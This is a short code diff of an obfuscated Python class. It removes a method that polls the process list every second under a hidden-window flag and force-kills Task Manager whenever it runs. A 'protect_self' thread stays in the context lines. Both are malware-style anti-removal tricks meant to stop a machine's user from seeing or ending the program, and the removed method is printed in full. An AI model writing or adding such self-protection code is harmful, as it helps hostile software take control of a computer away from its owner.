@@ -21,16 +21,6 @@ class a:
         self.h()
         self.i()
         threading.Thread(target=self.protect_self, daemon=True).start()
-    def block_taskmgr(self):
-        import subprocess
-        while True:
-            try:
-                tasks = subprocess.check_output('tasklist', creationflags=0x08000000).decode(errors='ignore')
-                if 'Taskmgr.exe' in tasks or 'taskmgr.exe' in tasks:
-                    subprocess.call('taskkill /F /IM taskmgr.exe', creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            except:
-                pass
-            time.sleep(1)
 
     def protect_self(self):
         import subprocess
